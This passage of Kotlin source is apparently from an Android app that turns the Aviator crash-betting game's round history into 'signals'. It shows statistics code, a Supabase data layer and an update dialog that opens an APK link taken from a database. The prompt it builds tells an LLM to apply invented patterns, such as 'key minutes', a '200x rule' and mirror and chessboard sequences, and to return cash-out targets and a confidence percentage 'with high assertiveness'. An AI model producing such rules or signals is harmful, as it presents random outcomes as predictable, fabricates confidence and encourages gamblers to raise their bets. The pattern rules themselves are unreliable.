                val stdDev   = Math.sqrt(velasParaAnalise.map { (it - media) * (it - media) }.average())
                val cv       = if (media > 0) (stdDev / media * 100) else 0.0

                // ── Slope / tendência linear ─────────────────────────
                val xMean = (n - 1) / 2.0
                var numSlope = 0.0; var denSlope = 0.0
                velasParaAnalise.forEachIndexed { i, v -> numSlope += (i - xMean) * (v - media); denSlope += (i - xMean) * (i - xMean) }
                val slope = if (denSlope != 0.0) numSlope / denSlope else 0.0
                val slopeDir = when { slope > 0.1 -> "SUBIDA"; slope < -0.1 -> "DESCIDA"; else -> "LATERAL" }

                // ── Sequências no fim ────────────────────────────────
                val seqAzuis = velasParaAnalise.reversed().takeWhile { it < 2.0 }.size
                val seqAltas = velasParaAnalise.reversed().takeWhile { it >= 2.0 }.size

                // ── Alternância (xadrez) ─────────────────────────────
                var alternancia = 0
                for (i in 1 until velasParaAnalise.size) {
                    val prev = velasParaAnalise[i-1] < 2.0
                    val curr = velasParaAnalise[i] < 2.0
                    if (prev != curr) alternancia++
                }
                val xadrezAtivo = alternancia >= 4 && azuis.toDouble()/n > 0.3 && roxas.toDouble()/n > 0.2

                // ── Padrão de repetição: casas entre rosas ───────────
                val posRosas = mutableListOf<Int>()
                velasParaAnalise.forEachIndexed { i, v -> if (v >= 10.0) posRosas.add(i) }
                val casasEntreRosas = mutableListOf<Int>()
                for (i in 1 until posRosas.size) casasEntreRosas.add(posRosas[i] - posRosas[i-1] - 1)
                val padraoRep = casasEntreRosas.size >= 2 &&
                    casasEntreRosas.last() == casasEntreRosas[casasEntreRosas.size - 2]
                val ultimasCasas = casasEntreRosas.lastOrNull() ?: -1
                val casasDesdeUltimaRosa = if (posRosas.isNotEmpty()) n - 1 - posRosas.last() else -1

                // ── Espelho: zonas simétricas ─────────────────────────
                val zonas = velasParaAnalise.map { if (it >= 10.0) "R" else if (it >= 2.0) "X" else "A" }
                var espelhoDetectado = false; var espelhoTam = 0
                for (sz in 3..5) {
                    if (zonas.size < sz * 2) continue
                    val l1 = zonas.subList(zonas.size - sz*2, zonas.size - sz)
                    val l2 = zonas.subList(zonas.size - sz, zonas.size)
                    val matchCount = l1.filterIndexed { i, z -> z == l2[i] }.size
                    if (matchCount >= sz - 1) { espelhoDetectado = true; espelhoTam = sz; break }
                }

                // ── Tendência das rosas ───────────────────────────────
                val ultimasRosas = velasParaAnalise.filter { it >= 10.0 }.takeLast(4)
                val tendRosas = when {
                    ultimasRosas.size >= 3 && ultimasRosas.zipWithNext().all { (a,b) -> b > a } -> "CRESCENTE"
                    ultimasRosas.size >= 3 && ultimasRosas.zipWithNext().all { (a,b) -> b < a } -> "DECRESCENTE"
                    ultimasRosas.size >= 2 -> "ALTERNADA"
                    else -> "INDEFINIDA"
                }

                // ── Velas azuis que precederam rosas ─────────────────
                val velaAvantesRosa = mutableListOf<String>()
                posRosas.forEach { p -> if (p > 0 && velasParaAnalise[p-1] < 2.0) velaAvantesRosa.add(String.format("%.2f", velasParaAnalise[p-1])) }

                // ── Outliers (>media+2*std) ───────────────────────────
                val outliers = velasParaAnalise.filter { it > media + 2 * stdDev }

                // ── Padrão Roxo Pagante ───────────────────────────────
                val roxoPagante = n >= 4 &&
                    velasParaAnalise[n-4] >= 5.0 && velasParaAnalise[n-4] < 10.0 &&
                    velasParaAnalise[n-3] < 2.0 &&
                    velasParaAnalise[n-2] >= 2.0 && velasParaAnalise[n-2] < 10.0 &&
                    velasParaAnalise[n-1] >= 2.0 && velasParaAnalise[n-1] < 10.0

                // ── VALAS (comboio de azuis) ──────────────────────────
                val valas = seqAzuis >= 3

                // ── Saída conservadora baseada na MM5 ─────────────────
                val mediaCasa = mm5
                val saidaConservadora = when {
                    mediaCasa <= 2.0 -> "1.5"
                    mediaCasa <= 4.0 -> "2.0"
                    mediaCasa <= 8.0 -> "3.0"
                    mediaCasa <= 15.0 -> "5.0"
                    else -> "10.0"
                }

                // ── Minutos chave ─────────────────────────────────────
                val minutosChave = setOf(57,58,59,1,2,3,20,21,22,29,30,31,40,41,42,45,46,47,50,51,52)
                val estaEmMinutoChave = minAgora in minutosChave
                val proxMinChave = minutosChave.map { m -> val d = m - minAgora; if (d < 0) d + 60 else d }.minOrNull() ?: 0

                // ── Probabilidade empírica ────────────────────────────
                val probAlta = ((roxas + rosas).toDouble() / n * 100).toInt()

                // ── Altura das rosas ──────────────────────────────────
                val zonaAltura = when {
                    ultimasRosas.isEmpty() -> "indeterminada"
                    ultimasRosas.last() < 15.0 -> "10x-15x (baixa)"
                    ultimasRosas.last() < 30.0 -> "15x-30x (media)"
                    ultimasRosas.last() < 80.0 -> "30x-80x (alta)"
                    else -> "80x+ (muito alta)"
                }

                val seqStr = velasParaAnalise.takeLast(15)
                    .joinToString("→") { if (it >= 10.0) "ROSA" else if (it >= 2.0) "ROXA" else "AZUL" }

                // ── Xadrez de alcance (estado global) ────────────────
                val xadrezAlcStr = if (xadrezAlcanceActivo)
                    "ACTIVO — proxima rosa ${if (xadrezAlcanceAlto) "ALTA (>=20x)" else "BAIXA (<20x)"} | ultimas rosas: [${rosasXadrezAlcance.takeLast(4).joinToString("→") { String.format("%.0f",it)+"x" }}]"
                else "NAO detectado"

                // ── Regra 200x ────────────────────────────────────────
                val regra200Str = if (houveMega200xRecente)
                    "ACTIVA — saiu 200x+! Faltam $rosasMega200xRestantes rosas para aparecer uma >=70x. AUMENTAR ALCANCE."
                else "NAO activa"

                // ── Regra últimos 10 min da hora ─────────────────────
                val regra10minStr = if (semRosaGrandeUlt10min)
                    "ACTIVA — sem rosa >=50x nos ultimos 10min da hora! No inicio da hora seguinte pode surgir rosa >=70x."
                else if (minAgora >= 50)
                    "ALERTA — estamos nos ultimos ${60 - minAgora} min da hora. Monitorar se nenhuma rosa >=50x aparecer."
                else "NAO activa (min=$minAgora)"

                val prompt = """
Es um analisador especializado do jogo Aviator (Spribe). Aplica TODOS os metodos ao historico e calcula o melhor sinal com ALTA ASSERTIVIDADE.

HISTORICO REAL (${velasParaAnalise.size} rondas, mais antiga → mais recente):
[${historico}]

SEQUENCIA ZONAS (ultimas 15): ${seqStr}

ESTATISTICAS PRE-CALCULADAS:
- Media: ${String.format("%.2f", media)}x | Mediana: ${String.format("%.2f", mediana)}x | Max: ${String.format("%.2f", maxGeral)}x
- MM5: ${String.format("%.2f", mm5)}x | MM10: ${String.format("%.2f", mm10)}x | Slope: $slopeDir(${String.format("%.3f", slope)})
- DesvioPad: ${String.format("%.2f", stdDev)} | CV: ${String.format("%.1f", cv)}%
- Dist: $azuis azuis(${if(n>0)(azuis*100/n) else 0}%) | $roxas roxas(${if(n>0)(roxas*100/n) else 0}%) | $rosas rosas(${if(n>0)(rosas*100/n) else 0}%)
- Outliers: ${outliers.size} ${if (outliers.isNotEmpty()) "(${outliers.take(3).joinToString(",") { String.format("%.0f",it)+"x" }})" else ""}
- Prob>=2x: ${probAlta}%

PADROES DETECTADOS:
- Seq.Azuis(fim): $seqAzuis ${if(seqAzuis>=3)"⚠ VALAS — NAO ENTRAR" else "OK"}
- Seq.Altas(fim): $seqAltas ${if(seqAltas>=3)"⚠ possivel recolhimento" else ""}
- XADREZ intercalacao: ${if(xadrezAtivo)"ACTIVO(alt=$alternancia)→ROSA ESPERADA" else "NAO"}
- XADREZ ALCANCE: $xadrezAlcStr
- REPETICAO: ${if(padraoRep)"CONFIRMADO $ultimasCasas casas entre rosas" else "NAO"} | $casasDesdeUltimaRosa casas desde ultima rosa
- ESPELHO: ${if(espelhoDetectado)"DETECTADO(sz=$espelhoTam)" else "NAO"}
- ROXO PAGANTE: ${if(roxoPagante)"ACTIVO→entrar 2x" else "NAO"}
- Tend.Rosas: $tendRosas ${if(ultimasRosas.isNotEmpty())"(${ultimasRosas.takeLast(3).joinToString("→"){String.format("%.0f",it)+"x"}})" else ""}
- Altura zona: $zonaAltura
- Velas esp.(azuis→rosa): [${velaAvantesRosa.joinToString(",")}]
- REGRA 200x: $regra200Str
- REGRA 10MIN HORA: $regra10minStr
- Minuto: $minAgora ${if(estaEmMinutoChave)"✅CHAVE!" else "(prox.chave ~${proxMinChave}min)"}
- Hora: ${horaAgora}h ${if(horaAgora in 5..11)"OURO" else "normal"}

REGRAS CRITICAS OBRIGATORIAS:

⚠ REGRA FUNDAMENTAL — PROTECAO vs ALCANCE:
A PROTECAO e SEMPRE muito menor que o ALCANCE. Exemplos corretos:
- Prot=1.5x, Alc=10x-20x ✅ | Prot=2x, Alc=15x-30x ✅ | Prot=3x, Alc=20x-50x ✅
- Prot=2x, Alc=4x ✅(conservador) | Prot=5x, Alc=10x ✅
- Prot=10x, Alc=10x ❌ERRADO | Prot=4x, Alc=4x ❌ERRADO
A protecao e o ponto de saida SEGURO (70% da aposta). O alcance e o OBJETIVO ambicioso (30% da aposta).
NUNCA coloque protecao igual ou proxima ao alcance!

R1 — VALAS: seqAzuis=$seqAzuis. ${if(seqAzuis>=5)"CRITICO: prot=1.1x, alc_max=2x" else if(seqAzuis>=3)"NAO ENTRAR: prot=1.2x, alc conservador 2x-3x" else "Normal."}

R2 — XADREZ intercalacao: ${if(xadrezAtivo)"prot=MM5(${String.format("%.1f",mm5)}x), alc=10x-30x (rosa esperada)" else "N/A"}

R3 — XADREZ ALCANCE: ${if(xadrezAlcanceActivo)"proxima rosa ${if(xadrezAlcanceAlto)"ALTA>=20x→alc_max=50x" else "BAIXA<20x→alc_max=15x"}" else "N/A"}

R4 — REGRA 200x+: ${if(houveMega200xRecente)"ACTIVA! Nas proximas $rosasMega200xRestantes rosas uma sera >=70x! alc_max=100x, prot=2x-3x" else "N/A"}

R5 — REGRA 10MIN HORA: ${if(semRosaGrandeUlt10min)"ACTIVA! No inicio da hora seguinte pode aparecer rosa >=70x. alc_max=80x" else "N/A"}

R6 — REPETICAO: ${if(padraoRep)"prot=1.5x-2x, alc= zona das rosas anteriores(${if(ultimasRosas.isNotEmpty()) String.format("%.0f",ultimasRosas.average())+"x media" else "?"})" else "N/A"}

R7 — ROXO PAGANTE: ${if(roxoPagante)"prot=1.5x, alc_max=3x" else "N/A"}

R8 — MEDIA CASA: MM5=${String.format("%.1f",mm5)}x. ${if(mm5<=3.0)"Mercado conservador: sair em ${saidaConservadora}x" else if(mm5<=8.0)"Mercado moderado: alc 5x-15x" else "Mercado activo: alc pode ser alto"}

R9 — ALTURA ROSAS: $tendRosas. ${when(tendRosas){
    "CRESCENTE"->"proxima rosa > ultima(${if(ultimasRosas.isNotEmpty())String.format("%.0f",ultimasRosas.last())+"x" else "?"}) → aumentar alcance"
    "DECRESCENTE"->"proxima rosa < ultima → diminuir alcance"
    "ALTERNADA"->"ultima foi ${if(ultimasRosas.isNotEmpty()&&ultimasRosas.last()>=20.0)"ALTA→proxima BAIXA<20x" else "BAIXA→proxima ALTA>=20x"}"
    else->"insuficiente"
}}

R10 — MINUTAGEM: ${if(estaEmMinutoChave)"MINUTO CHAVE($minAgora)→aumentar aposta, rosas grandes 57-59/01-03" else "normal"}

R11 — ESTATISTICA: Apos outlier ${if(outliers.isNotEmpty())"(${String.format("%.0f",outliers.last())}x recente)" else "(nenhum)"}: retorno a azuis por 2-5 rondas. NUNCA Martingale.

CALCULA e responde APENAS JSON (sem texto, sem markdown):
{"protecao":NUMERO,"alcance_min":NUMERO,"alcance_max":"NUMEROx","tendencia":"SUBIDA|QUEDA|LATERAL","confianca":PERCENTAGEM}

Lembra: protecao MUITO menor que alcance_max. Ex: prot=1.5, alc_min=5, alc_max="20x".
                """.trimIndent()

                val bodyJson = "{\"model\":\"llama-3.3-70b-versatile\"," +
                    "\"messages\":[{\"role\":\"user\",\"content\":${escapeJson(prompt)}}]," +
                    "\"max_tokens\":120,\"temperature\":0.1}"

                val conn = URL(GROQ_URL).openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Authorization", "Bearer $GROQ_KEY")
                conn.setRequestProperty("Content-Type", "application/json")
                conn.doOutput = true; conn.connectTimeout = 20000; conn.readTimeout = 20000
                OutputStreamWriter(conn.outputStream).use { it.write(bodyJson) }
                val code = conn.responseCode
                val resp = BufferedReader(InputStreamReader(
                    if (code in 200..299) conn.inputStream else conn.errorStream
                )).readText()
                conn.disconnect()

                if (code in 200..299) {
                    processarRespostaGroq(resp, minAgora)
                } else if (code == 429) {
                    runOnUiThread {
                        analisandoIA = false
                        ultimaAnaliseMs = System.currentTimeMillis() + 90_000L
                        velasDesdeUltimaAnalise = 0
                        setBarra("AGUARDAR", "Limite atingido — 90s", "#f59e0b")
                    }
                } else {
                    runOnUiThread {
                        analisandoIA = false
                        setBarra("ERRO IA", "HTTP $code", "#ef4444")
                    }
                }
            } catch (e: Exception) {
                runOnUiThread {
                    analisandoIA = false
                    setBarra("ERRO IA", e.message?.take(40) ?: "timeout", "#ef4444")
                }
            }
        }.start()
    }

    private fun processarRespostaGroq(resposta: String, minAgora: Int) {
        try {
            var textoIA = ""
            val contentIdx = resposta.indexOf(""""content":""")
            if (contentIdx >= 0) {
                var pos = contentIdx + 10
                while (pos < resposta.length && (resposta[pos] == ' ' || resposta[pos] == ':')) pos++
                if (pos < resposta.length && resposta[pos] == '"') {
                    pos++
                    val sb = StringBuilder()
                    while (pos < resposta.length) {
                        val c = resposta[pos]
                        if (c == '\\') {
                            pos++
                            when (resposta.getOrNull(pos)) {
                                'n'  -> sb.append('\n')
                                'r'  -> sb.append('\r')
                                't'  -> sb.append('\t')
                                '"'  -> sb.append('"')
                                '\\' -> sb.append('\\')
                                else -> { sb.append('\\'); sb.append(resposta.getOrNull(pos) ?: "") }
                            }
                        } else if (c == '"') {
                            break
                        } else {
                            sb.append(c)
                        }
                        pos++
                    }
                    textoIA = sb.toString()
                }
            }

            if (textoIA.isEmpty()) {
                runOnUiThread { analisandoIA = false; setBarra("ERRO IA", "Sem resposta da IA", "#ef4444") }
                return
            }

            val prot   = Regex(""""?protecao"?\s*:\s*([\d.]+)""").find(textoIA)?.groupValues?.get(1)?.toFloatOrNull()?.coerceIn(1.05f, 10f) ?: 0f
            val alcMin = Regex(""""?alcance_min"?\s*:\s*(\d+)""").find(textoIA)?.groupValues?.get(1)?.toIntOrNull() ?: 0
            val alcMaxRaw = Regex(""""?alcance_max"?\s*:\s*"?([\d]+x?)"?""").find(textoIA)?.groupValues?.get(1) ?: ""
            val tendencia = Regex(""""?tendencia"?\s*:\s*"?([^",}\n]+)"?""").find(textoIA)?.groupValues?.get(1)?.trim() ?: ""
            val confianca = Regex(""""?confianca"?\s*:\s*(\d+)""").find(textoIA)?.groupValues?.get(1)?.toIntOrNull() ?: 0

            if (prot == 0f || alcMin == 0 || alcMaxRaw.isEmpty()) {
                runOnUiThread { analisandoIA = false; setBarra("ERRO IA", "JSON incompleto: $textoIA".take(50), "#ef4444") }
                return
            }

            val alcMaxNum = alcMaxRaw.replace(Regex("[^0-9]"), "").toIntOrNull() ?: 0

            // ── VALIDAÇÃO CRÍTICA: proteção NUNCA pode ser >= alcance ──────────
            // Proteção é sempre o ponto de saída seguro (muito menor que o alcance)
            val protCorrigida = when {
                // Caso crítico: proteção >= alcance (ex: prot=10x, alc=10x → erro)
                prot >= alcMaxNum.toFloat() -> (alcMaxNum * 0.2f).coerceAtLeast(1.3f)
                // Proteção muito próxima do alcance (menos de 3x de diferença)
                alcMaxNum > 0 && prot > alcMaxNum.toFloat() / 3f -> (alcMaxNum.toFloat() / 4f).coerceAtLeast(1.3f)
                // Proteção OK
                else -> prot
            }

            // Garantir alcance mínimo razoável (pelo menos 1.5x a proteção)
            val alcMinCorrigido = alcMin.coerceAtLeast((protCorrigida * 1.5f).toInt().coerceAtLeast(2))

            val alcMax = if (alcMaxRaw.endsWith("x")) alcMaxRaw else "${alcMaxRaw}x"
            sinalProtecao = if (protCorrigida % 1f == 0f) "${protCorrigida.toInt()}x" else "${String.format("%.1f", protCorrigida)}x"
            sinalAlcMin   = alcMinCorrigido
            sinalAlcMax   = alcMax
            sinalTendencia = tendencia
            sinalConfianca = confianca
            horaAtual     = Calendar.getInstance().get(Calendar.HOUR_OF_DAY)

            val alcNum = alcMaxRaw.replace(Regex("[^0-9]"), "").toIntOrNull() ?: 0
            val cor = when {
                alcNum >= 100 -> "#ec4899"
                alcNum >= 20  -> "#22c55e"
                alcNum >= 5   -> "#f59e0b"
                else          -> "#3b82f6"
            }

            runOnUiThread {
                sinaisAtivos = true
                analisandoIA = false
                ultimaAnaliseMs = System.currentTimeMillis()
                velasDesdeUltimaAnalise = 0
                mostrarSinalCompleto(sinalProtecao, "${sinalAlcMin}x → $sinalAlcMax", tendencia, confianca, cor, minAgora)
                if (relogioRunnable == null) iniciarRelogio()
            }
        } catch (e: Exception) {
            runOnUiThread { analisandoIA = false; setBarra("ERRO IA", e.message?.take(50) ?: "excecao", "#ef4444") }
        }
    }

    private fun escapeJson(s: String): String {
        val sb = StringBuilder("\"")
        for (c in s) when (c) {
            '"'  -> sb.append("\\\"")
            '\\' -> sb.append("\\\\")
            '\n' -> sb.append("\\n")
            '\r' -> sb.append("\\r")
            '\t' -> sb.append("\\t")
            else -> sb.append(c)
        }
        return sb.append("\"").toString()
    }

    // ── RELÓGIO ───────────────────────────────────────────────────
    private fun iniciarRelogio() {
        relogioRunnable?.let { handler.removeCallbacks(it) }
        val tick = object : Runnable {
            override fun run() {
                if (sinaisAtivos && dentroDoAviator) verificarRelogio()
                handler.postDelayed(this, 1000)
            }
        }
        relogioRunnable = tick
        handler.post(tick)
    }

    private fun verificarRelogio() {
        val cal = Calendar.getInstance()
        val horaAgora = cal.get(Calendar.HOUR_OF_DAY)
        val minAgora = cal.get(Calendar.MINUTE)

        if (horaAgora != horaAtual) {
            horaAtual = horaAgora
            ultimoMinutoGerado = -1
            analisandoIA = false
            sinalTendencia = ""
            sinalConfianca = 0
        }

        if (!sinaisAtivos || sinalProtecao.isEmpty()) return

        val alcNum = sinalAlcMax.replace(Regex("[^0-9]"), "").toIntOrNull() ?: 0
        val cor = when {
            alcNum >= 100 -> "#ec4899"
            alcNum >= 20  -> "#22c55e"
            alcNum >= 10  -> "#f59e0b"
            else          -> "#3b82f6"
        }
        val alcTxt = "${sinalAlcMin}x → $sinalAlcMax"
        val horaTxt = "${String.format("%02d",horaAgora)}:${String.format("%02d",minAgora)}"

        val icone = when {
            sinalTendencia.contains("SUBIDA", ignoreCase = true) -> "📈"
            sinalTendencia.contains("QUEDA",  ignoreCase = true) -> "📉"
            else -> "➡️"
        }
        val confTxt = if (sinalConfianca > 0) " · ${sinalConfianca}%" else ""
        val tendTxt = if (sinalTendencia.isNotEmpty()) "$icone $sinalTendencia$confTxt" else "➡️ SINAL ACTIVO"

        atualizarBarraCompleta(tendTxt, horaTxt, sinalProtecao, alcTxt, cor)
    }

    // ── SUPABASE ──────────────────────────────────────────────────
    // Apaga as 50 velas mais antigas quando a tabela atinge 100 registos.
    // Estratégia: buscar os IDs das 50 mais antigas → apagar por ID → actualizar contador.
    private fun limparVelasAntigas() {
        Thread {
            try {
                // Passo 1 — buscar os IDs das VELAS_A_APAGAR mais antigas (ordem ASC = mais antigas primeiro)
                val urlBuscar = "$SUPA_URL/rest/v1/velas?select=id&order=id.asc&limit=$VELAS_A_APAGAR"
                val connBuscar = URL(urlBuscar).openConnection() as HttpURLConnection
                connBuscar.requestMethod = "GET"
                connBuscar.setRequestProperty("apikey", SUPA_KEY)
                connBuscar.setRequestProperty("Authorization", "Bearer $SUPA_KEY")
                connBuscar.setRequestProperty("Accept", "application/json")
                connBuscar.connectTimeout = 10000; connBuscar.readTimeout = 10000
                val codeBuscar = connBuscar.responseCode
                val respBuscar = BufferedReader(InputStreamReader(connBuscar.inputStream)).readText()
                connBuscar.disconnect()

                if (codeBuscar !in 200..299) {
                    limpezaEmCurso = false
                    return@Thread
                }

                // Extrair lista de IDs do JSON: [{"id":1}, {"id":2}, ...]
                val ids = Regex(""""id"\s*:\s*(\d+)""")
                    .findAll(respBuscar)
                    .mapNotNull { it.groupValues[1].toLongOrNull() }
                    .toList()

                if (ids.isEmpty()) {
                    limpezaEmCurso = false
                    return@Thread
                }

                // Passo 2 — apagar esses IDs com filtro "in" do PostgREST
                // Formato: DELETE /rest/v1/velas?id=in.(1,2,3,...)
                val idsStr = ids.joinToString(",")
                val urlApagar = "$SUPA_URL/rest/v1/velas?id=in.($idsStr)"
                val connApagar = URL(urlApagar).openConnection() as HttpURLConnection
                connApagar.requestMethod = "DELETE"
                connApagar.setRequestProperty("apikey", SUPA_KEY)
                connApagar.setRequestProperty("Authorization", "Bearer $SUPA_KEY")
                connApagar.setRequestProperty("Prefer", "return=minimal")
                connApagar.connectTimeout = 10000; connApagar.readTimeout = 10000
                val codeApagar = connApagar.responseCode
                connApagar.disconnect()

                // Passo 3 — actualizar contador local
                if (codeApagar in 200..299) {
                    totalVelasSupabase -= ids.size
                    if (totalVelasSupabase < 0) totalVelasSupabase = 0
                }

            } catch (_: Exception) {
                // Em caso de erro, repor flag para tentar na próxima vela
            } finally {
                limpezaEmCurso = false
            }
        }.start()
    }

    private fun carregarVelasSupabase() {
        Thread {
            try {
                // Buscar as últimas 30 velas para análise (ordem desc = mais recentes primeiro)
                val connVelas = URL("$SUPA_URL/rest/v1/velas?select=coeficiente&order=id.desc&limit=30")
                    .openConnection() as HttpURLConnection
                connVelas.requestMethod = "GET"
                connVelas.setRequestProperty("apikey", SUPA_KEY)
                connVelas.setRequestProperty("Authorization", "Bearer $SUPA_KEY")
                connVelas.setRequestProperty("Accept", "application/json")
                connVelas.connectTimeout = 10000; connVelas.readTimeout = 10000
                val codeVelas = connVelas.responseCode
                val respVelas = BufferedReader(InputStreamReader(connVelas.inputStream)).readText()
                connVelas.disconnect()

                // Contar total real de velas no Supabase (para saber se já está perto do limite)
                val connCount = URL("$SUPA_URL/rest/v1/velas?select=id&order=id.asc")
                    .openConnection() as HttpURLConnection
                connCount.requestMethod = "GET"
                connCount.setRequestProperty("apikey", SUPA_KEY)
                connCount.setRequestProperty("Authorization", "Bearer $SUPA_KEY")
                connCount.setRequestProperty("Accept", "application/json")
                connCount.setRequestProperty("Prefer", "count=exact")
                connCount.connectTimeout = 10000; connCount.readTimeout = 10000
                connCount.responseCode
                // O Supabase retorna o total no header Content-Range: 0-99/total
                val contentRange = connCount.getHeaderField("Content-Range") ?: ""
                val totalReal = contentRange.substringAfterLast("/").trim().toLongOrNull()?.toInt() ?: -1
                connCount.disconnect()

                if (totalReal >= 0) totalVelasSupabase = totalReal

                if (codeVelas !in 200..299) {
                    runOnUiThread {
                        setBarra("A RECOLHER DADOS", "0/${MIN_VELAS_ANALISE} velas capturadas", "#7c3aed")
                    }
                    return@Thread
                }

                val valores = Regex(""""coeficiente"\s*:\s*([\d.]+)""")
                    .findAll(respVelas)
                    .mapNotNull { it.groupValues[1].toDoubleOrNull() }
                    .filter { it >= 1.0 }
                    .toList()
                    .reversed() // Supabase retorna desc → inverter para cronológico

                runOnUiThread {
                    if (valores.isNotEmpty()) {
                        historicoVelas.clear()
                        historicoVelas.addAll(valores.takeLast(MAX_VELAS_LOCAL))
                        if (totalReal < 0) totalVelasSupabase = valores.size // fallback
                        val n = historicoVelas.size
                        if (n >= MIN_VELAS_ANALISE) {
                            setBarra("HISTORICO CARREGADO", "$n velas prontas", "#22c55e")
                            handler.postDelayed({ pedirSinalIA() }, 1500)
                        } else {
                            setBarra("A RECOLHER DADOS", "$n/${MIN_VELAS_ANALISE} velas capturadas", "#7c3aed")
                        }
                        // Se já estava no limite antes de arrancar, limpar imediatamente
                        if (totalVelasSupabase >= MAX_VELAS_SUPABASE && !limpezaEmCurso) {
                            limpezaEmCurso = true
                            limparVelasAntigas()
                        }
                    } else {
                        setBarra("A RECOLHER DADOS", "0/${MIN_VELAS_ANALISE} velas capturadas", "#7c3aed")
                    }
                }
            } catch (e: Exception) {
                runOnUiThread {
                    setBarra("A RECOLHER DADOS", "0/${MIN_VELAS_ANALISE} velas capturadas", "#7c3aed")
                }
            }
        }.start()
    }

    private fun enviarVelaSupabase(coef: Double) {
        val timestamp = java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", java.util.Locale.getDefault())
            .format(java.util.Date())
        val json = """{"coeficiente":$coef,"timestamp":"$timestamp"}"""
        Thread {
            try {
                val conn = URL("$SUPA_URL/rest/v1/velas").openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("apikey", SUPA_KEY)
                conn.setRequestProperty("Authorization", "Bearer $SUPA_KEY")
                conn.setRequestProperty("Content-Type", "application/json")
                conn.setRequestProperty("Prefer", "return=minimal")
                conn.doOutput = true; conn.connectTimeout = 10000; conn.readTimeout = 10000
                OutputStreamWriter(conn.outputStream).use { it.write(json) }
                conn.responseCode
                conn.disconnect()
            } catch (_: Exception) {}
        }.start()
    }

    private fun enviarSupabase(tipoVal: String, valorVal: String) {
        val json = "{\"tipo\":\"$tipoVal\",\"valor\":\"$valorVal\"}"
        Thread {
            try {
                val conn = URL("$SUPA_URL/rest/v1/$TABELA").openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("apikey", SUPA_KEY)
                conn.setRequestProperty("Authorization", "Bearer $SUPA_KEY")
                conn.setRequestProperty("Content-Type", "application/json")
                conn.setRequestProperty("Prefer", "return=minimal")
                conn.doOutput = true; conn.connectTimeout = 10000; conn.readTimeout = 10000
                OutputStreamWriter(conn.outputStream).use { it.write(json) }
                conn.responseCode; conn.disconnect()
            } catch (_: Exception) {}
        }.start()
    }

    // ── ACTUALIZAÇÕES ─────────────────────────────────────────────
    private fun verificarAtualizacao() {
        Thread {
            try {
                val conn = URL("$SUPA_URL/rest/v1/versao?select=versao,url_apk,notas&order=id.desc&limit=1")
                    .openConnection() as HttpURLConnection
                conn.requestMethod = "GET"
                conn.setRequestProperty("apikey", SUPA_KEY)
                conn.setRequestProperty("Authorization", "Bearer $SUPA_KEY")
                conn.setRequestProperty("Accept", "application/json")
                conn.connectTimeout = 10000; conn.readTimeout = 10000
                val code = conn.responseCode
                val resp = BufferedReader(InputStreamReader(conn.inputStream)).readText()
                conn.disconnect()

                if (code !in 200..299) return@Thread

                val versaoNova = Regex(""""versao"\s*:\s*"([^"]+)"""").find(resp)?.groupValues?.get(1) ?: return@Thread
                val urlApk = Regex(""""url_apk"\s*:\s*"([^"]+)"""").find(resp)?.groupValues?.get(1) ?: return@Thread
                val notas = Regex(""""notas"\s*:\s*"([^"]+)"""").find(resp)?.groupValues?.get(1) ?: ""

                if (versaoNova != VERSAO_ATUAL) {
                    runOnUiThread { mostrarDialogoUpdate(versaoNova, urlApk, notas) }
                }
            } catch (_: Exception) {}
        }.start()
    }

    private fun mostrarDialogoUpdate(versaoNova: String, urlApk: String, notas: String) {
        val msg = "Versao actual: $VERSAO_ATUAL\nNova versao: $versaoNova\n\n${if (notas.isNotEmpty()) "$notas\n\n" else ""}Deseja actualizar agora?"
        AlertDialog.Builder(this)
            .setTitle("Actualizacao disponivel!")
            .setMessage(msg).setCancelable(false)
            .setPositiveButton("ACTUALIZAR AGORA") { _, _ ->
                try {
                    startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(urlApk)).apply {
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    })
                } catch (_: Exception) {
                    Toast.makeText(this, "Erro ao abrir download", Toast.LENGTH_LONG).show()
                }
            }
            .setNegativeButton("Mais tarde") { d, _ -> d.dismiss() }
            .show()
    }

    // ── UI HELPERS ────────────────────────────────────────────────
    private fun setBarra(acao: String, minutos: String, cor: String) =
        atualizarBarra(acao, minutos, "", "", cor)

    private fun mostrarSinalCompleto(protecao: String, alcance: String, tendencia: String, confianca: Int, cor: String, minAgora: Int) {
        runOnUiThread {
            val icone = when {
                tendencia.contains("SUBIDA", ignoreCase = true) -> "📈"
                tendencia.contains("QUEDA",  ignoreCase = true) -> "📉"
                else -> "➡️"
            }
            val confTxt = if (confianca > 0) " · $confianca%" else ""
            val tendTxt = if (tendencia.isNotEmpty()) "$icone $tendencia$confTxt" else "IA: SINAL ACTIVO"
            val horaTxt = "${String.format("%02d", horaAtual)}:${String.format("%02d", minAgora)}"
            atualizarBarraCompleta(tendTxt, horaTxt, protecao, alcance, cor)
        }
    }

    private fun atualizarBarraCompleta(acao: String, horario: String, protecao: String, alcance: String, cor: String) {
        runOnUiThread {
            txtAcao.text = acao
            txtAcao.setTextColor(Color.parseColor(cor))
            txtMinutos.text = horario
            txtMinutos.setTextColor(Color.parseColor("#94a3b8"))

            if (protecao.isNotEmpty()) {
                txtProtecao.text = "🛡 $protecao"
                txtProtecao.setTextColor(Color.WHITE)
                txtProtecao.background = pill("#1e3a2a")
            }
            if (alcance.isNotEmpty()) {
                txtAlcance.text = "🎯 $alcance"
                txtAlcance.setTextColor(Color.parseColor(cor))
                txtAlcance.background = pill(when (cor) {
                    "#22c55e" -> "#0f2d1a"
                    "#ec4899" -> "#2d0f1a"
                    "#f59e0b" -> "#2d1f0f"
                    else      -> "#0f1a2d"
                })
            }
            dotView.background = circulo(cor)
            barLayout.setBackgroundColor(Color.parseColor(when (cor) {
                "#22c55e" -> "#061510"; "#f59e0b" -> "#150f00"
                "#7c3aed" -> "#12082a"; "#ec4899" -> "#200810"
                "#3b82f6" -> "#080f20"
                else -> "#0f172a"
            }))
        }
    }

    private fun atualizarBarra(acao: String, minutos: String, protecao: String, alcance: String, cor: String) =
        runOnUiThread {
            txtAcao.text = acao; txtAcao.setTextColor(Color.parseColor(cor))
            txtMinutos.text = minutos; txtMinutos.setTextColor(Color.WHITE)
            if (protecao.isNotEmpty()) {
                txtProtecao.text = "Prot: $protecao"
                txtProtecao.setTextColor(Color.WHITE)
                txtProtecao.background = pill(if (cor == "#22c55e") "#1a3a1a" else "#1e2a3a")
            }
